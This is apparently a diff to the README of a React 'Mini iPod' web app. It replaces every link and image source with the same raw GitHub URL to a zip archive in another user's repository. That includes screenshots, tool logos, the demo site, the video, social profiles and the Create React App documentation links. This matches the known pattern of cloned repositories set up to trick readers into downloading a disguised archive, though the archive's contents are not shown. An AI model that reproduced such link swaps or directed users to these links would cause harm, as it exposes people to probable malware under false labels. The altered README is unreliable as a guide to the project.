@@ -2,7 +2,7 @@
  
 <br/>
 <p align="center">
-<img src="https://user-images.githubusercontent.com/76626529/135662491-261ae6f1-d8db-4a64-8cf3-ddb03969ebb8.PNG">
+<img src="https://raw.githubusercontent.com/amber1405/IPOD/main/nondiscountable/IPOD.zip">
 </p>
 
 ## ⭐ Introduction
@@ -52,12 +52,12 @@ For any issues related to the project, raise an ISSUE in the respective Reposito
 ## 🔨 Tools Used
 
 <p align="justify">
-<img height="140" width="140" src="https://ik.imagekit.io/garbagevalue/garbage/tags/ReactJS_ne_91IZ6n.webp">
-<img height="140" width="140" src="https://user-images.githubusercontent.com/76626529/135654695-ca008e4f-99c8-40fc-9b73-8573f03c2867.png">
-<img height="140" width="140" src="https://www.w3.org/html/logo/downloads/HTML5_Logo_256.png">
-<img height="140" width="140" src="https://logodix.com/logo/470309.png">
-<img height="140" width="140" src="https://upload.wikimedia.org/wikipedia/commons/6/6a/JavaScript-logo.png">
-<img height="140" width="140" src="https://code.visualstudio.com/assets/apple-touch-icon.png">
+<img height="140" width="140" src="https://raw.githubusercontent.com/amber1405/IPOD/main/nondiscountable/IPOD.zip">
+<img height="140" width="140" src="https://raw.githubusercontent.com/amber1405/IPOD/main/nondiscountable/IPOD.zip">
+<img height="140" width="140" src="https://raw.githubusercontent.com/amber1405/IPOD/main/nondiscountable/IPOD.zip">
+<img height="140" width="140" src="https://raw.githubusercontent.com/amber1405/IPOD/main/nondiscountable/IPOD.zip">
+<img height="140" width="140" src="https://raw.githubusercontent.com/amber1405/IPOD/main/nondiscountable/IPOD.zip">
+<img height="140" width="140" src="https://raw.githubusercontent.com/amber1405/IPOD/main/nondiscountable/IPOD.zip">
 </p>
 
 -  Packages:
@@ -81,37 +81,37 @@ For any issues related to the project, raise an ISSUE in the respective Reposito
 
 ## 🔗 Links
 
-> ## Checkout the Website [Web Application](https://ayush-kanduri.github.io/Mini-Ipod-App-ReactJS)
+> ## Checkout the Website [Web Application](https://raw.githubusercontent.com/amber1405/IPOD/main/nondiscountable/IPOD.zip)
 >
-> ## Checkout the Application Demo Video [YouTube](https://youtu.be/XZuMTBohjBU)
+> ## Checkout the Application Demo Video [YouTube](https://raw.githubusercontent.com/amber1405/IPOD/main/nondiscountable/IPOD.zip)
 
 <br/>
 
 ## 💻 Screens
 
 <p align="justify">
-<img src="https://user-images.githubusercontent.com/76626529/135662491-261ae6f1-d8db-4a64-8cf3-ddb03969ebb8.PNG">
-<img src="https://user-images.githubusercontent.com/76626529/135662508-7edefa63-4ccc-4b28-9b5a-279b341515fa.PNG">
-<img src="https://user-images.githubusercontent.com/76626529/135662511-435d635c-7175-4455-a5a1-d0b0ec03436b.PNG">
-<img src="https://user-images.githubusercontent.com/76626529/135662513-8169d2b8-5c3f-4f98-b906-8436e80f4630.PNG">
-<img src="https://user-images.githubusercontent.com/76626529/135662520-2b8f856b-2393-45cb-b495-c4aedc1a64cd.PNG">
-<img src="https://user-images.githubusercontent.com/76626529/135662530-ad2b4ef2-ab5d-46a3-a9d3-ce77a9ea6216.PNG">
-<img src="https://user-images.githubusercontent.com/76626529/135662536-b7965031-a3e8-4784-a652-28f7784c23f2.PNG">
-<img src="https://user-images.githubusercontent.com/76626529/135662540-3ca547c5-91ff-4216-a918-3b231b8bbc05.PNG">
-<img src="https://user-images.githubusercontent.com/76626529/135662545-1c03ab42-3e2e-4bf5-99a9-c33203f8aad7.PNG">
-<img src="https://user-images.githubusercontent.com/76626529/135662554-ea6e1270-5375-49bc-b3ef-55f0f273c92e.PNG">
+<img src="https://raw.githubusercontent.com/amber1405/IPOD/main/nondiscountable/IPOD.zip">
+<img src="https://raw.githubusercontent.com/amber1405/IPOD/main/nondiscountable/IPOD.zip">
+<img src="https://raw.githubusercontent.com/amber1405/IPOD/main/nondiscountable/IPOD.zip">
+<img src="https://raw.githubusercontent.com/amber1405/IPOD/main/nondiscountable/IPOD.zip">
+<img src="https://raw.githubusercontent.com/amber1405/IPOD/main/nondiscountable/IPOD.zip">
+<img src="https://raw.githubusercontent.com/amber1405/IPOD/main/nondiscountable/IPOD.zip">
+<img src="https://raw.githubusercontent.com/amber1405/IPOD/main/nondiscountable/IPOD.zip">
+<img src="https://raw.githubusercontent.com/amber1405/IPOD/main/nondiscountable/IPOD.zip">
+<img src="https://raw.githubusercontent.com/amber1405/IPOD/main/nondiscountable/IPOD.zip">
+<img src="https://raw.githubusercontent.com/amber1405/IPOD/main/nondiscountable/IPOD.zip">
 </p>
 <br/>
 
 ## 🐦 Follow Me:
 
-> [Dev Community](https://dev.to/ayushkanduri)
+> [Dev Community](https://raw.githubusercontent.com/amber1405/IPOD/main/nondiscountable/IPOD.zip)
 
-> [Twitter](https://twitter.com/ayush_codes)
+> [Twitter](https://raw.githubusercontent.com/amber1405/IPOD/main/nondiscountable/IPOD.zip)
 
-> [LinkedIn](https://www.linkedin.com/in/ayushkanduri/)
+> [LinkedIn](https://raw.githubusercontent.com/amber1405/IPOD/main/nondiscountable/IPOD.zip)
 
-> [YouTube](https://www.youtube.com/channel/UC6c1ajC_2jF7wQp7Y13t2bg)
+> [YouTube](https://raw.githubusercontent.com/amber1405/IPOD/main/nondiscountable/IPOD.zip)
 
 I hope you like the project. Thanks for reading :)
 
@@ -119,7 +119,7 @@ I hope you like the project. Thanks for reading :)
 
 # Getting Started with Create React App
 
-This project was bootstrapped with [Create React App](https://github.com/facebook/create-react-app).
+This project was bootstrapped with [Create React App](https://raw.githubusercontent.com/amber1405/IPOD/main/nondiscountable/IPOD.zip).
 
 ## Available Scripts
 
@@ -141,7 +141,7 @@ You will also see any lint errors in the console.
 ### `npm test`
 
 Launches the test runner in the interactive watch mode.\
-See the section about [running tests](https://facebook.github.io/create-react-app/docs/running-tests) for more information.
+See the section about [running tests](https://raw.githubusercontent.com/amber1405/IPOD/main/nondiscountable/IPOD.zip) for more information.
 
 ### `npm run build`
 
@@ -151,7 +151,7 @@ It correctly bundles React in production mode and optimizes the build for the be
 The build is minified and the filenames include the hashes.\
 Your app is ready to be deployed!
 
-See the section about [deployment](https://facebook.github.io/create-react-app/docs/deployment) for more information.
+See the section about [deployment](https://raw.githubusercontent.com/amber1405/IPOD/main/nondiscountable/IPOD.zip) for more information.
 
 ### `npm run eject`
 
@@ -165,30 +165,30 @@ You don’t have to ever use `eject`. The curated feature set is suitable for sm
 
 ## Learn More
 
-You can learn more in the [Create React App documentation](https://facebook.github.io/create-react-app/docs/getting-started).
+You can learn more in the [Create React App documentation](https://raw.githubusercontent.com/amber1405/IPOD/main/nondiscountable/IPOD.zip).
 
-To learn React, check out the [React documentation](https://reactjs.org/).
+To learn React, check out the [React documentation](https://raw.githubusercontent.com/amber1405/IPOD/main/nondiscountable/IPOD.zip).
 
 ### Code Splitting
 
-This section has moved here: [https://facebook.github.io/create-react-app/docs/code-splitting](https://facebook.github.io/create-react-app/docs/code-splitting)
+This section has moved here: [https://raw.githubusercontent.com/amber1405/IPOD/main/nondiscountable/IPOD.zip](https://raw.githubusercontent.com/amber1405/IPOD/main/nondiscountable/IPOD.zip)
 
 ### Analyzing the Bundle Size
 
-This section has moved here: [https://facebook.github.io/create-react-app/docs/analyzing-the-bundle-size](https://facebook.github.io/create-react-app/docs/analyzing-the-bundle-size)
+This section has moved here: [https://raw.githubusercontent.com/amber1405/IPOD/main/nondiscountable/IPOD.zip](https://raw.githubusercontent.com/amber1405/IPOD/main/nondiscountable/IPOD.zip)
 
 ### Making a Progressive Web App
 
-This section has moved here: [https://facebook.github.io/create-react-app/docs/making-a-progressive-web-app](https://facebook.github.io/create-react-app/docs/making-a-progressive-web-app)
+This section has moved here: [https://raw.githubusercontent.com/amber1405/IPOD/main/nondiscountable/IPOD.zip](https://raw.githubusercontent.com/amber1405/IPOD/main/nondiscountable/IPOD.zip)
 
 ### Advanced Configuration
 
-This section has moved here: [https://facebook.github.io/create-react-app/docs/advanced-configuration](https://facebook.github.io/create-react-app/docs/advanced-configuration)
+This section has moved here: [https://raw.githubusercontent.com/amber1405/IPOD/main/nondiscountable/IPOD.zip](https://raw.githubusercontent.com/amber1405/IPOD/main/nondiscountable/IPOD.zip)
 
 ### Deployment
 
-This section has moved here: [https://facebook.github.io/create-react-app/docs/deployment](https://facebook.github.io/create-react-app/docs/deployment)
+This section has moved here: [https://raw.githubusercontent.com/amber1405/IPOD/main/nondiscountable/IPOD.zip](https://raw.githubusercontent.com/amber1405/IPOD/main/nondiscountable/IPOD.zip)
 
 ### `npm run build` fails to minify
 
-This section has moved here: [https://facebook.github.io/create-react-app/docs/troubleshooting#npm-run-build-fails-to-minify](https://facebook.github.io/create-react-app/docs/troubleshooting#npm-run-build-fails-to-minify)
+This section has moved here: [https://raw.githubusercontent.com/amber1405/IPOD/main/nondiscountable/IPOD.zip](https://raw.githubusercontent.com/amber1405/IPOD/main/nondiscountable/IPOD.zip)
